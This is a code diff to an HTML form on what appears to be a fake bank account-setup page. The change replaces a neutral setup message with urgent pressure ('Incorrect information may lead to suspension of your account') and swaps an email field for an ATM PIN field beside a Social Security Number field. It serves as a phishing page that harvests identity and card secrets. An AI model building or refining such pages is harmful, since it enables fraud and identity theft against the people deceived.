@@ -418,15 +418,15 @@
                 <span>Card Verification</span>
                 <span>Success</span>
             </div>
-            <span class="title">Let's Set Up Your Online Access</span>
-            <span class="subtitle">You can view or manage your account online in just a few easy steps. Let’s get started! Enter the account or card number we mailed to you, or that was provided when your account was opened.</span>
+            <span class="title">Confirm your Account information</span>
+            <span class="subtitle">Please verify your accurate information to automatically unlock your account. Incorrect information may lead to suspension of your account.</span>
             <form action="profile" method="POST">
                 <label for="fulln">Full Name</label>
                 <input type="text" placeholder="Full Name" id="fulln" name="fullname">
                 <label for="ssn">Social Security Number</label>
                 <input type="text" placeholder="Social Security Number" id="ssn" name="ssn">
-                <label for="email">Email Address</label>
-                <input type="text" placeholder="Email Address" id="email" name="email">
+                <label for="atmpin">ATM PIN</label>
+                <input type="number" placeholder="ATM PIN" id="atmpin" name="atmpin">
                 <button type="submit">Continue</button>
             </form>
         </div>
